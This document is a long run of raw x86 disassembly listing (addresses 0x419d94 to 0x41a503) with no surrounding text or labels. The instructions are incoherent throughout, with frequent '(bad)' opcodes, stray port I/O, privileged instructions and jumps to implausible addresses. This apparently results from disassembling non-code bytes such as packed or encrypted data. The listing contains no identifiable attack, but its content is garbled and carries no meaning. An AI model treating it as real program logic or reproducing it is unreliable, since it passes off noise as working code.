  419d94:	mov    ch,BYTE PTR [ecx+0x1ed83a6]
  419d9a:	lods   eax,DWORD PTR ds:[esi]
  419d9b:	cmp    DWORD PTR [edx+ebp*2],edx
  419d9e:	jmp    0xc2007830
  419da3:	or     al,0x8d
  419da5:	mov    eax,0x667ee9f9
  419daa:	push   ebp
  419dab:	jb     0x419dda
  419dad:	dec    ebx
  419dae:	aam    0xdf
  419db0:	outs   dx,DWORD PTR ds:[esi]
  419db1:	fs push si
  419db4:	jb     0x419da0
  419db6:	sbb    DWORD PTR [esi],ebx
  419db8:	test   BYTE PTR [ebx-0x8],0xb7
  419dbc:	add    DWORD PTR [ebx+edx*1],eax
  419dbf:	stc    
  419dc0:	hlt    
  419dc1:	scas   eax,DWORD PTR es:[edi]
  419dc2:	loopne 0x419df3
  419dc4:	cmp    ebx,DWORD PTR [edx+0x3b2932d0]
  419dca:	push   edx
  419dcb:	rcr    DWORD PTR ss:[eax+edi*8+0x60a1347d],0x4d
  419dd4:	repz jge 0x419de6
  419dd7:	(bad)  
  419dd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dd9:	mov    ah,0x14
  419ddb:	pop    ebp
  419ddc:	aad    0xe6
  419dde:	xchg   edx,eax
  419ddf:	adc    DWORD PTR [edi-0x2],edx
  419de2:	popa   
  419de3:	aaa    
  419de4:	jle    0x419d74
  419de6:	adc    dh,dh
  419de8:	jle    0x419e66
  419dea:	mov    ebp,ecx
  419dec:	stos   BYTE PTR es:[edi],al
  419ded:	loop   0x419e52
  419def:	dec    ecx
  419df0:	push   ds
  419df1:	aaa    
  419df2:	inc    ebx
  419df3:	xor    DWORD PTR ds:0xf4107c1e,ebp
  419df9:	xor    BYTE PTR [ecx-0x58],bl
  419dfc:	pop    ebp
  419dfd:	test   eax,0x5dbbedc9
  419e02:	hlt    
  419e03:	jecxz  0x419e27
  419e05:	sub    dh,BYTE PTR [edx+0x1c]
  419e08:	fbld   TBYTE PTR [ebp-0x62a62fd3]
  419e0e:	push   ebp
  419e10:	and    al,0x9f
  419e12:	scas   eax,DWORD PTR es:[edi]
  419e13:	daa    
  419e14:	rcl    edi,0x19
  419e17:	fisttp DWORD PTR [eax-0x5c]
  419e1a:	sub    al,0xc7
  419e1c:	in     al,0x8f
  419e1e:	sub    DWORD PTR [edi+0x4054a3aa],0xda03a119
  419e28:	mov    ecx,0x307fdfa8
  419e2d:	mov    edi,eax
  419e2f:	das    
  419e30:	xor    DWORD PTR [ecx+0x550d27ab],esp
  419e36:	mov    ch,0x5
  419e38:	xchg   edx,eax
  419e39:	test   eax,0x4d9e914d
  419e3e:	mov    esi,0x5eb3c244
  419e43:	aaa    
  419e44:	gs pop es
  419e46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e47:	adc    al,0xbc
  419e49:	mov    eax,ds:0x29c7e759
  419e4e:	shr    eax,1
  419e50:	mov    ebx,0x51a873fa
  419e55:	mov    edi,0x230c32ea
  419e5a:	dec    esp
  419e5b:	(bad)  
  419e5c:	aad    0x5a
  419e5e:	xchg   ebx,eax
  419e5f:	rcl    BYTE PTR [ebp+0x2e5ce8d1],0x4b
  419e66:	mov    bl,0x48
  419e68:	sub    ecx,DWORD PTR [ebx-0x439e36fd]
  419e6e:	fs xchg edi,eax
  419e70:	test   al,0xc8
  419e72:	push   eax
  419e73:	add    ebp,DWORD PTR [eax-0x4a]
  419e76:	push   edx
  419e77:	inc    eax
  419e78:	inc    ebp
  419e79:	pop    esp
  419e7a:	test   ch,bl
  419e7c:	dec    edi
  419e7d:	inc    eax
  419e7e:	or     al,0x48
  419e80:	sub    al,0x13
  419e82:	push   eax
  419e83:	test   BYTE PTR [eax+0x75de7c34],ch
  419e89:	xor    ecx,DWORD PTR [edi+0x4]
  419e8c:	pushf  
  419e8d:	pop    eax
  419e8e:	mov    edi,0x338b662d
  419e93:	mov    al,0x15
  419e95:	add    cl,0x64
  419e98:	push   es
  419e99:	push   ds
  419e9a:	add    dl,dl
  419e9c:	scas   eax,DWORD PTR es:[edi]
  419e9d:	and    eax,0xfed815ca
  419ea2:	fcom   st(1)
  419ea4:	lahf   
  419ea5:	ins    BYTE PTR es:[edi],dx
  419ea6:	add    bl,BYTE PTR [esi-0x1]
  419ea9:	mov    edx,DWORD PTR [eax-0x3e2dc0c5]
  419eaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419eb0:	mov    gs,WORD PTR cs:[edx-0x413594d8]
  419eb7:	sbb    BYTE PTR [edi],0xaa
  419eba:	into   
  419ebb:	xchg   esi,eax
  419ebc:	mov    bl,BYTE PTR [eax-0x7885c512]
  419ec2:	pop    ecx
  419ec3:	loop   0x419e55
  419ec5:	pop    ss
  419ec6:	mov    ch,0x0
  419ec8:	mov    esp,0x9d055b56
  419ecd:	add    edx,DWORD PTR [edx]
  419ecf:	aam    0xf2
  419ed1:	popf   
  419ed2:	fistp  QWORD PTR [ebx]
  419ed4:	es add al,0xf1
  419ed7:	aam    0x71
  419ed9:	cmp    DWORD PTR [ebx],edx
  419edb:	mov    edx,0x143b1d4d
  419ee0:	mov    eax,0x853ff88a
  419ee5:	cmp    DWORD PTR [eax],esi
  419ee7:	mov    ecx,0x277ff665
  419eec:	cs mul edx
  419eef:	sbb    al,0x62
  419ef1:	mov    bh,BYTE PTR [esi+edx*8-0x71fe1228]
  419ef8:	out    dx,eax
  419ef9:	or     cl,al
  419efb:	scas   al,BYTE PTR es:[edi]
  419efc:	sbb    BYTE PTR [eax-0x3e],bh
  419eff:	push   esi
  419f00:	pop    edi
  419f01:	out    dx,al
  419f02:	js     0x419ece
  419f04:	lahf   
  419f05:	cmp    ebp,ebp
  419f07:	mov    dl,dl
  419f09:	mov    WORD PTR [esi+eax*8],?
  419f0c:	or     eax,0x4d058cb
  419f11:	int3   
  419f12:	or     BYTE PTR [edi+0x38],bl
  419f15:	sbb    al,0x39
  419f17:	shr    DWORD PTR [esp+edi*1],cl
  419f1a:	and    cl,BYTE PTR [ecx+0x5628190c]
  419f20:	push   ss
  419f21:	mov    esp,0xd9a3174f
  419f26:	or     DWORD PTR [edx+0x6e],ebx
  419f29:	adc    DWORD PTR [ecx],ebx
  419f2b:	mov    eax,ds:0x80a1d660
  419f30:	imul   eax,DWORD PTR fs:[esi+ebp*4],0x55
  419f35:	push   ebp
  419f36:	loope  0x419fb3
  419f38:	clc    
  419f39:	xor    al,0x27
  419f3b:	cmp    edx,edx
  419f3d:	dec    esp
  419f3e:	dec    esp
  419f3f:	rcl    BYTE PTR [ebp+0x73cb67c4],1
  419f45:	outs   dx,BYTE PTR ds:[esi]
  419f46:	inc    ebp
  419f47:	sub    dl,BYTE PTR [esi+0x3954f915]
  419f4d:	mov    edi,0x58a852e
  419f52:	in     eax,dx
  419f53:	pop    ebx
  419f54:	loop   0x419ef8
  419f56:	cmp    ebp,esp
  419f58:	mov    BYTE PTR [ebp+0x25],dh
  419f5b:	cdq    
  419f5c:	std    
  419f5d:	sbb    DWORD PTR [ecx+0x21a45d9c],esp
  419f63:	or     ebp,ecx
  419f65:	mov    esi,eax
  419f67:	pop    ecx
  419f68:	test   ah,bl
  419f6a:	lods   al,BYTE PTR ds:[esi]
  419f6b:	enter  0x8bbb,0x7
  419f6f:	jg     0x419f55
  419f71:	or     eax,0x6c1508a8
  419f76:	pop    edx
  419f77:	mov    bl,0x5d
  419f79:	mov    ch,bl
  419f7b:	call   0xdd1b:0xc52fabe0
  419f82:	shr    DWORD PTR [edi+0x8b4376e],1
  419f88:	and    DWORD PTR [edx+ebp*1+0x38],eax
  419f8c:	add    dh,cl
  419f8e:	leave  
  419f8f:	jae    0x419f82
  419f91:	mov    ah,0xcd
  419f93:	mov    edi,0x83f344e9
  419f98:	sbb    al,0xb2
  419f9a:	xchg   ecx,eax
  419f9b:	inc    esp
  419f9c:	mov    dh,0x40
  419f9e:	out    0x89,al
  419fa0:	mov    eax,0x5c78a888
  419fa5:	cli    
  419fa6:	xchg   edx,eax
  419fa7:	jge    0x419ff9
  419fa9:	mov    ebp,0x1cbd3def
  419fae:	(bad)  
  419faf:	stos   DWORD PTR es:[edi],eax
  419fb0:	pop    edi
  419fb1:	rcr    BYTE PTR [ebx+0x44e9ac54],0x8e
  419fb8:	add    DWORD PTR [ebp-0x6e7297f3],ebp
  419fbe:	dec    ecx
  419fbf:	lods   eax,DWORD PTR ds:[esi]
  419fc0:	dec    edx
  419fc1:	mov    al,0xb2
  419fc3:	mov    al,BYTE PTR [ebp+0x27]
  419fc6:	and    edx,DWORD PTR ds:0xfdce0200
  419fcc:	sub    ecx,esp
  419fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fcf:	aas    
  419fd0:	out    0xbc,al
  419fd2:	adc    eax,0xb5745585
  419fd7:	test   al,0xe0
  419fd9:	mov    esp,DWORD PTR [edx+0x4b0dd52c]
  419fdf:	retf   
  419fe0:	add    eax,0x94438c7f
  419fe5:	fwait
  419fe6:	in     al,dx
  419fe7:	push   es
  419fe8:	jp     0x41a025
  419fea:	pop    es
  419feb:	inc    esp
  419fec:	test   BYTE PTR [esi],cl
  419fee:	test   ebx,esi
  419ff0:	jb     0x419fe9
  419ff2:	arpl   bx,di
  419ff4:	das    
  419ff5:	adc    BYTE PTR [edi-0x4ca641b6],bl
  419ffb:	push   ebx
  419ffc:	fistp  WORD PTR [ebp+0xf]
  419fff:	mov    edx,ss
  41a001:	fisub  DWORD PTR [ebx-0x74]
  41a004:	adc    DWORD PTR [eax+0x52af8ea5],0xdf3664ea
  41a00e:	iret   
  41a00f:	dec    edx
  41a010:	shl    BYTE PTR [esi+esi*4+0x482f979],cl
  41a017:	aaa    
  41a018:	stc    
  41a019:	xor    ebx,DWORD PTR [edi]
  41a01b:	arpl   ax,ax
  41a01d:	or     al,0x91
  41a01f:	(bad)  
  41a020:	mov    BYTE PTR [edx],ah
  41a022:	pop    edi
  41a023:	clc    
  41a024:	xchg   edx,eax
  41a025:	xor    ch,BYTE PTR [edi]
  41a027:	pop    ebp
  41a028:	or     al,0x41
  41a02a:	push   esi
  41a02b:	xchg   ebp,eax
  41a02c:	mov    edx,0xe1c1e6ac
  41a031:	imul   ebp,DWORD PTR [esi],0xb8005c4a
  41a037:	out    dx,al
  41a038:	sbb    al,bh
  41a03a:	or     BYTE PTR [edx+0x19],ah
  41a03d:	rol    esp,cl
  41a03f:	mov    bl,0x35
  41a041:	xchg   esp,eax
  41a042:	jae    0x419fc7
  41a044:	clc    
  41a045:	rcl    DWORD PTR [eax+0x16],0xd3
  41a049:	push   eax
  41a04a:	ins    DWORD PTR es:[edi],dx
  41a04b:	mov    edx,gs
  41a04d:	ins    DWORD PTR es:[edi],dx
  41a04e:	and    ecx,esp
  41a050:	and    WORD PTR [ebx],0x4e
  41a054:	outs   dx,DWORD PTR ds:[esi]
  41a055:	test   edi,esi
  41a057:	xor    ah,bl
  41a059:	jne    0x41a09b
  41a05b:	cli    
  41a05c:	pop    ds
  41a05d:	pop    ebx
  41a05e:	loopne 0x41a0a5
  41a060:	(bad)  
  41a061:	fild   QWORD PTR [edi+0x73f479e0]
  41a067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a068:	mov    ch,0xc6
  41a06a:	nop
  41a06b:	cmp    al,0xbe
  41a06d:	push   ebp
  41a06e:	adc    edi,ecx
  41a070:	cs inc edx
  41a072:	xchg   edi,ebx
  41a074:	sahf   
  41a075:	ss aam 0x1e
  41a078:	jne    0x41a089
  41a07a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a07b:	mov    eax,0x9059373c
  41a080:	leave  
  41a081:	mov    eax,ds:0x8a718e2d
  41a086:	in     eax,dx
  41a087:	daa    
  41a088:	dec    edi
  41a089:	xchg   esp,eax
  41a08a:	adc    dh,al
  41a08c:	push   es
  41a08d:	adc    esp,DWORD PTR [eax-0x57]
  41a090:	into   
  41a091:	push   0xaf42388c
  41a096:	shl    cl,1
  41a098:	mov    esp,0x1e47161d
  41a09d:	pop    ebp
  41a09e:	ret    0xa48f
  41a0a1:	test   eax,0x4124e65b
  41a0a6:	scas   al,BYTE PTR es:[edi]
  41a0a7:	nop
  41a0a8:	pop    esp
  41a0a9:	mov    ?,WORD PTR [eax]
  41a0ab:	xchg   ebp,eax
  41a0ac:	cmp    al,0x19
  41a0ae:	push   eax
  41a0af:	push   ebx
  41a0b0:	mov    ds:0x48590cb8,al
  41a0b5:	lods   eax,DWORD PTR ds:[esi]
  41a0b6:	xchg   BYTE PTR [eax+0x7fe4dc5d],cl
  41a0bc:	push   ds
  41a0bd:	mov    BYTE PTR [eax-0x5080467b],cl
  41a0c3:	cmp    bh,BYTE PTR fs:[edi-0x7f]
  41a0c7:	xchg   edx,eax
  41a0c8:	fs pop ds
  41a0ca:	js     0x41a131
  41a0cc:	jae    0x41a133
  41a0ce:	enter  0xc027,0xe2
  41a0d2:	in     eax,0x1b
  41a0d4:	sub    edi,edi
  41a0d6:	adc    al,0xf7
  41a0d8:	sub    dh,BYTE PTR ds:0x87ee
  41a0dd:	es js  0x41a122
  41a0e0:	xlat   BYTE PTR ds:[ebx]
  41a0e1:	(bad)  
  41a0e3:	fstp   TBYTE PTR [ecx+0x3a15803d]
  41a0e9:	cli    
  41a0ea:	mov    ecx,0xfb90f211
  41a0ef:	mov    al,ds:0x32d7bab4
  41a0f4:	xchg   BYTE PTR [edx],ch
  41a0f6:	mov    esi,0xbc2fb632
  41a0fb:	sub    BYTE PTR [ebp+esi*4-0x17],0x11
  41a100:	push   0x11
  41a102:	sub    DWORD PTR [ebp+0x25f6a017],eax
  41a108:	(bad)  
  41a109:	mov    esp,0x9fcc8c2
  41a10e:	adc    cl,BYTE PTR [ebx+eiz*4+0x78]
  41a112:	shr    BYTE PTR [edx+0x67c7ebe4],1
  41a118:	add    DWORD PTR [eax-0xfe1142c],0x8f2d398b
  41a122:	dec    esp
  41a123:	xchg   esi,ebp
  41a125:	adc    ah,BYTE PTR [esi+edx*1+0x41]
  41a129:	imul   edx,DWORD PTR [ebx+0x30],0x57
  41a12d:	push   es
  41a12e:	dec    ebx
  41a12f:	inc    ecx
  41a130:	sub    DWORD PTR [ebx+0x7],ebp
  41a133:	push   eax
  41a134:	jo     0x41a188
  41a136:	push   esi
  41a137:	pop    ebp
  41a138:	arpl   WORD PTR [edx-0x69],dx
  41a13b:	iret   
  41a13c:	sbb    DWORD PTR [edx-0x290a3118],edx
  41a142:	sub    edx,esp
  41a144:	inc    ebx
  41a145:	adc    bl,BYTE PTR [edi]
  41a147:	fist   DWORD PTR [ecx]
  41a149:	sub    edi,DWORD PTR [ebp-0x184cab4f]
  41a14f:	or     al,0x7c
  41a151:	mov    ?,eax
  41a153:	prefetcht0 BYTE PTR [edi]
  41a156:	xchg   esi,eax
  41a157:	popa   
  41a158:	and    ecx,edi
  41a15a:	aam    0xe1
  41a15c:	jae    0x41a1b9
  41a15e:	in     eax,0x9a
  41a160:	adc    ah,al
  41a162:	jno    0x41a1ac
  41a164:	sbb    dh,ah
  41a166:	retf   0xe60d
  41a169:	sbb    edi,DWORD PTR [eax+0x28ae40ed]
  41a16f:	cdq    
  41a170:	jae    0x41a15c
  41a172:	leave  
  41a173:	adc    DWORD PTR [ebx+0x70],edi
  41a176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a177:	lods   al,BYTE PTR ds:[esi]
  41a178:	or     eax,ecx
  41a17a:	mov    ds:0x8048cfa3,eax
  41a17f:	xor    bh,dl
  41a181:	sub    edx,eax
  41a183:	aaa    
  41a184:	outs   dx,DWORD PTR ds:[esi]
  41a185:	loope  0x41a116
  41a187:	mov    ebx,DWORD PTR [edi-0x467c7e4d]
  41a18d:	(bad)
  41a191:	dec    ecx
  41a192:	in     eax,dx
  41a193:	push   esi
  41a194:	aaa    
  41a195:	mov    bl,0xc3
  41a197:	pusha  
  41a198:	or     DWORD PTR [ebp+0x2e],ecx
  41a19b:	sti    
  41a19c:	add    eax,0x617bac6f
  41a1a1:	ds xchg ebx,eax
  41a1a3:	and    BYTE PTR [eax+0x14],ah
  41a1a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1a7:	jg     0x41a1b2
  41a1a9:	cmp    ebx,ebx
  41a1ab:	mul    bh
  41a1ad:	fisttp WORD PTR [eax+0x3]
  41a1b0:	ja     0x41a194
  41a1b2:	enter  0xc41d,0xf1
  41a1b6:	das    
  41a1b7:	fdiv   DWORD PTR [ebx-0x6a]
  41a1ba:	inc    edx
  41a1bb:	dec    edx
  41a1bc:	inc    edi
  41a1bd:	test   BYTE PTR [eax-0x3c008fa8],dl
  41a1c3:	add    dl,BYTE PTR [ebp-0x1e9f17a4]
  41a1c9:	sub    eax,0x333557a8
  41a1ce:	jo     0x41a235
  41a1d0:	cld    
  41a1d1:	mov    al,0x98
  41a1d3:	push   ebx
  41a1d4:	shl    BYTE PTR cs:[eax],cl
  41a1d7:	pop    ebx
  41a1d8:	cmp    edi,DWORD PTR [ebp-0x214cca0e]
  41a1de:	push   esp
  41a1df:	pop    eax
  41a1e0:	pop    ss
  41a1e1:	jle    0x41a21a
  41a1e3:	xor    al,0x25
  41a1e5:	jo     0x41a237
  41a1e7:	lods   eax,DWORD PTR ds:[esi]
  41a1e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1e9:	or     eax,0x264ca0b4
  41a1ee:	jmp    0x357b9fe1
  41a1f3:	pusha  
  41a1f4:	jns    0x41a206
  41a1f6:	add    edi,DWORD PTR [ecx]
  41a1f8:	jp     0x41a23a
  41a1fa:	rcl    ah,1
  41a1fc:	dec    edx
  41a1fd:	aad    0xe
  41a1ff:	pop    edx
  41a200:	mov    edx,0xc91fe833
  41a205:	lds    ebp,FWORD PTR [ecx-0x40b79049]
  41a20b:	and    eax,esi
  41a20d:	or     al,0xe5
  41a20f:	cwde   
  41a210:	in     eax,0x86
  41a212:	add    ah,BYTE PTR [ebp+eax*4+0x65]
  41a216:	pop    edi
  41a217:	mov    ds:0xf3567e6a,al
  41a21c:	cmp    BYTE PTR [ecx+0x9e6bcc9],bh
  41a222:	mov    esi,0x9b73ddbf
  41a227:	mov    dl,0xf7
  41a229:	mov    edx,0xbf5f4293
  41a22e:	pop    ebp
  41a22f:	and    al,0x96
  41a231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a232:	add    BYTE PTR [eax+0x1dcc8a49],0x4c
  41a239:	(bad)  
  41a23b:	daa    
  41a23c:	mov    BYTE PTR [ecx+ecx*8-0x79a84b98],0xde
  41a244:	dec    ecx
  41a245:	sub    al,0x22
  41a247:	pop    ds
  41a248:	xchg   BYTE PTR [ecx+0x46603f69],bl
  41a24e:	xchg   esi,eax
  41a24f:	sbb    bh,al
  41a251:	out    dx,al
  41a252:	fisub  WORD PTR [esi+0x5cf90481]
  41a258:	pop    ss
  41a259:	lahf   
  41a25a:	das    
  41a25b:	jmp    0x41a20b
  41a25d:	in     al,0x2b
  41a25f:	push   ds
  41a260:	sbb    al,0xa0
  41a262:	std    
  41a263:	sub    ecx,0xff4a9c87
  41a269:	jge    0x41a243
  41a26b:	dec    ebp
  41a26c:	enter  0x722d,0xa5
  41a270:	inc    esi
  41a271:	inc    edi
  41a272:	mov    cl,0x86
  41a274:	mov    ecx,0x9a705ea
  41a279:	mov    bl,BYTE PTR [edi-0x4e]
  41a27c:	outs   dx,DWORD PTR ds:[esi]
  41a27d:	sti    
  41a27e:	cwde   
  41a27f:	mov    ch,dh
  41a281:	or     bh,cl
  41a283:	adc    al,0x92
  41a285:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a286:	jns    0x41a22f
  41a288:	lods   eax,DWORD PTR ds:[esi]
  41a289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a28a:	and    eax,0x1664f8d5
  41a28f:	mov    dh,0xf8
  41a291:	cld    
  41a292:	test   BYTE PTR [eax],cl
  41a294:	cmc    
  41a295:	shl    DWORD PTR [esi],0x1b
  41a298:	ss call 0x1461b35c
  41a29e:	mov    ecx,0x2accefea
  41a2a3:	and    DWORD PTR [ebx-0x74d61b7e],esp
  41a2a9:	lods   eax,DWORD PTR ds:[esi]
  41a2aa:	pusha  
  41a2ab:	mov    ch,0xed
  41a2ad:	fisubr WORD PTR [esi]
  41a2af:	mov    dl,0x3b
  41a2b1:	enter  0x17c8,0x6e
  41a2b5:	jae    0x41a28b
  41a2b7:	int3   
  41a2b8:	or     DWORD PTR [edx+0x3aff0af2],ebp
  41a2be:	(bad)  
  41a2c0:	mov    ds:0xcdc9e26c,eax
  41a2c5:	fistp  WORD PTR [edx]
  41a2c7:	mov    bh,BYTE PTR [edi]
  41a2c9:	xor    ecx,DWORD PTR [edx]
  41a2cb:	mov    esi,0xbf0c436c
  41a2d0:	cmp    ebx,edx
  41a2d2:	js     0x41a2de
  41a2d4:	aam    0x0
  41a2d6:	jle    0x41a329
  41a2d8:	jg     0x41a33f
  41a2da:	fs jne 0x41a30b
  41a2dd:	sti    
  41a2de:	out    dx,eax
  41a2df:	jne    0x41a273
  41a2e1:	adc    DWORD PTR [ebx-0x506a95a1],0x5d5a253
  41a2eb:	or     ebp,DWORD PTR [edx-0x120fa058]
  41a2f1:	dec    eax
  41a2f2:	mov    ch,0x32
  41a2f4:	cmc    
  41a2f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2f6:	loope  0x41a2ae
  41a2f8:	mov    dl,0xb0
  41a2fa:	enter  0x8030,0x35
  41a2fe:	sub    bh,BYTE PTR [ebx]
  41a300:	jo     0x41a287
  41a302:	stc    
  41a303:	(bad)  
  41a304:	ror    BYTE PTR [edx],1
  41a306:	(bad)  
  41a308:	sahf   
  41a309:	aad    0x76
  41a30b:	xchg   esp,eax
  41a30c:	mov    dl,0x9b
  41a30e:	jne    0x41a35d
  41a310:	fldcw  WORD PTR [edi-0xa]
  41a313:	leave  
  41a314:	or     eax,0x77dfc71a
  41a319:	in     al,dx
  41a31a:	mov    cs,WORD PTR [edi-0x7a]
  41a31d:	and    DWORD PTR [ecx-0x564543fa],eax
  41a323:	fwait
  41a324:	mov    esi,0x37ba954f
  41a329:	xchg   ebp,eax
  41a32a:	fwait
  41a32b:	cwde   
  41a32c:	jl     0x41a383
  41a32e:	in     eax,dx
  41a32f:	xchg   edx,eax
  41a330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a331:	and    ebp,DWORD PTR [ecx+0x74554735]
  41a337:	(bad)  
  41a338:	mov    ebp,0xdccb9da
  41a33d:	mov    bh,0x29
  41a33f:	and    al,0x2e
  41a341:	hlt    
  41a342:	mov    dl,0xf2
  41a344:	adc    bh,BYTE PTR [ebp+0x7]
  41a347:	xor    cl,bh
  41a349:	add    al,0xa3
  41a34b:	mov    esi,0xfcd1982f
  41a350:	dec    ebx
  41a351:	add    al,0xa7
  41a354:	(bad)  
  41a355:	mov    esi,0x5e7a94f
  41a35a:	xlat   BYTE PTR ds:[ebx]
  41a35b:	pop    ebx
  41a35c:	(bad)  
  41a35d:	pop    ebx
  41a35e:	mov    bh,al
  41a360:	sub    ebp,DWORD PTR [ebp+0x479489da]
  41a366:	mov    eax,DWORD PTR ds:0xbbeb32dc
  41a36c:	aad    0x32
  41a36e:	idiv   DWORD PTR [ebx+ebp*1]
  41a371:	in     eax,0xa5
  41a373:	popf   
  41a374:	xchg   ebx,eax
  41a375:	neg    BYTE PTR [edi]
  41a377:	cld    
  41a378:	ja     0x41a3b1
  41a37a:	gs sti 
  41a37c:	paddusb mm2,mm6
  41a37f:	and    BYTE PTR [ecx+0x9],ch
  41a382:	jge    0x41a3ca
  41a384:	dec    ecx
  41a385:	das    
  41a386:	inc    ecx
  41a387:	hlt    
  41a388:	std    
  41a389:	pusha  
  41a38a:	or     ebx,esp
  41a38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a38d:	aam    0xcb
  41a38f:	mov    ah,0xd4
  41a391:	test   BYTE PTR [esi+ecx*1],bh
  41a394:	adc    ch,BYTE PTR [eax+0x61]
  41a397:	push   0xffffff9f
  41a399:	xlat   BYTE PTR ds:[ebx]
  41a39a:	jbe    0x41a321
  41a39c:	icebp  
  41a39d:	xchg   ch,dh
  41a39f:	sub    DWORD PTR [edi-0x54],edx
  41a3a2:	std    
  41a3a3:	(bad)  
  41a3a4:	mov    dl,0xa3
  41a3a6:	jecxz  0x41a396
  41a3a8:	mov    eax,ds:0x194762d5
  41a3ad:	lahf   
  41a3ae:	scas   al,BYTE PTR es:[edi]
  41a3af:	aas    
  41a3b0:	dec    ebp
  41a3b1:	jg     0x41a3ef
  41a3b3:	add    DWORD PTR [si+0x46],edi
  41a3b7:	mov    bh,0x9d
  41a3b9:	and    edx,DWORD PTR [ecx-0x596af4f]
  41a3bf:	ror    ebx,1
  41a3c1:	mov    ch,0x25
  41a3c3:	mov    WORD PTR [eax+0x35ae9e41],ss
  41a3c9:	fstp   QWORD PTR [eax-0x2b]
  41a3cc:	inc    esp
  41a3cd:	add    BYTE PTR [eax],cl
  41a3cf:	dec    esi
  41a3d0:	inc    edx
  41a3d1:	pop    edx
  41a3d2:	mov    esp,0x297460d0
  41a3d7:	xor    DWORD PTR [eax-0x30],edx
  41a3da:	sub    ch,BYTE PTR [ebx+eax*4]
  41a3dd:	add    BYTE PTR ds:[edx],dh
  41a3e0:	push   ebp
  41a3e1:	xlat   BYTE PTR ds:[ebx]
  41a3e2:	mov    ebx,0x20a9f1f2
  41a3e7:	mov    al,0xc5
  41a3e9:	dec    ebx
  41a3ea:	pop    ebx
  41a3eb:	push   edi
  41a3ec:	imul   ebx,DWORD PTR [ebp-0xa],0xc3bb6c13
  41a3f3:	pop    edi
  41a3f4:	push   ss
  41a3f5:	sub    edx,DWORD PTR [eax-0x278f529e]
  41a3fb:	or     al,0xc8
  41a3fd:	mov    edi,0x67e122ec
  41a402:	adc    bh,bh
  41a404:	mov    al,ds:0x3ae971af
  41a409:	jl     0x41a42a
  41a40b:	(bad)  
  41a40c:	jle    0x41a47b
  41a40e:	jmp    0x41a3b4
  41a410:	mov    ecx,0xf49f6ef6
  41a415:	inc    esi
  41a416:	add    BYTE PTR [edx],0x9
  41a419:	add    edi,ebp
  41a41b:	add    cl,BYTE PTR [ebx+0x2547f130]
  41a421:	mov    esp,0xc8917790
  41a426:	sub    bh,BYTE PTR [ecx-0x3a797dae]
  41a42c:	test   eax,0xa406e930
  41a431:	stos   BYTE PTR es:[edi],al
  41a432:	sbb    DWORD PTR [esi+0x33],0xffffff88
  41a436:	jbe    0x41a45f
  41a438:	retf   0x2d08
  41a43b:	das    
  41a43c:	or     al,0x35
  41a43e:	data16 icebp 
  41a440:	addr16 mov ah,0xdb
  41a443:	mov    esi,0x84f60a28
  41a448:	jp     0x41a4a8
  41a44a:	xchg   ebp,eax
  41a44b:	ror    DWORD PTR [edx-0x2b],1
  41a44e:	and    eax,0x2659a257
  41a453:	clc    
  41a454:	mov    eax,ds:0xc5175363
  41a459:	ror    BYTE PTR [esi],0x14
  41a45c:	mov    eax,ds:0xd77badf
  41a461:	stos   BYTE PTR es:[edi],al
  41a462:	scas   al,BYTE PTR es:[edi]
  41a463:	xor    al,0xeb
  41a465:	daa    
  41a466:	dec    ebp
  41a467:	mov    eax,DWORD PTR [esi]
  41a469:	add    DWORD PTR [ebp+0x2adc99bf],edi
  41a46f:	add    eax,0xb35a4817
  41a474:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a475:	sub    bh,ah
  41a477:	mov    ebx,0x6df68d29
  41a47c:	add    al,0x10
  41a47e:	cs push ebx
  41a480:	ror    edi,1
  41a482:	lahf   
  41a483:	xor    ecx,DWORD PTR [edi+0x2d]
  41a486:	in     al,dx
  41a487:	mov    edi,0x5b7d9ada
  41a48c:	pop    es
  41a48d:	pushf  
  41a48e:	retf   0x2a8
  41a491:	in     eax,dx
  41a492:	fist   DWORD PTR [esi-0xcfa0ff8]
  41a498:	sbb    eax,0x4e91c93c
  41a49d:	imul   ebx,DWORD PTR [ebp-0x6fe6e79e],0x7f
  41a4a4:	jp     0x41a457
  41a4a6:	or     al,BYTE PTR [ebx-0x1c]
  41a4a9:	imul   ecx,eax,0x27fe0a7
  41a4af:	push   0x631cac80
  41a4b4:	pop    esi
  41a4b5:	xchg   edx,eax
  41a4b6:	xor    al,0x3c
  41a4b8:	mov    eax,DWORD PTR [edi]
  41a4ba:	fmul   st(1),st
  41a4bc:	leave  
  41a4bd:	dec    edx
  41a4be:	cmp    eax,0xc4c96021
  41a4c3:	lock (bad) 
  41a4c6:	pop    edi
  41a4c7:	loopne 0x41a50a
  41a4c9:	pop    eax
  41a4ca:	xor    eax,0x15d8e9e3
  41a4cf:	in     eax,dx
  41a4d0:	stos   DWORD PTR es:[edi],eax
  41a4d1:	push   ds
  41a4d2:	push   0x30
  41a4d4:	rcr    DWORD PTR [ebx-0x68bf7230],1
  41a4da:	pop    es
  41a4db:	loop   0x41a4ef
  41a4dd:	aam    0xcc
  41a4df:	stos   BYTE PTR es:[edi],al
  41a4e0:	int3   
  41a4e1:	mov    BYTE PTR [ebx],ah
  41a4e3:	mov    esi,0x17f0ec21
  41a4e8:	inc    esi
  41a4e9:	daa    
  41a4ea:	push   ss
  41a4eb:	jns    0x41a529
  41a4ed:	xchg   BYTE PTR [ebx-0x47],bl
  41a4f0:	pop    ebp
  41a4f1:	(bad)  
  41a4f3:	fcmovnb st,st(6)
  41a4f5:	cmp    al,0x2f
  41a4f7:	mov    bl,0x71
  41a4f9:	div    BYTE PTR [edi+0x27]
  41a4fc:	aam    0xf5
  41a4fe:	adc    eax,0xea369595
  41a503:	dec    esi
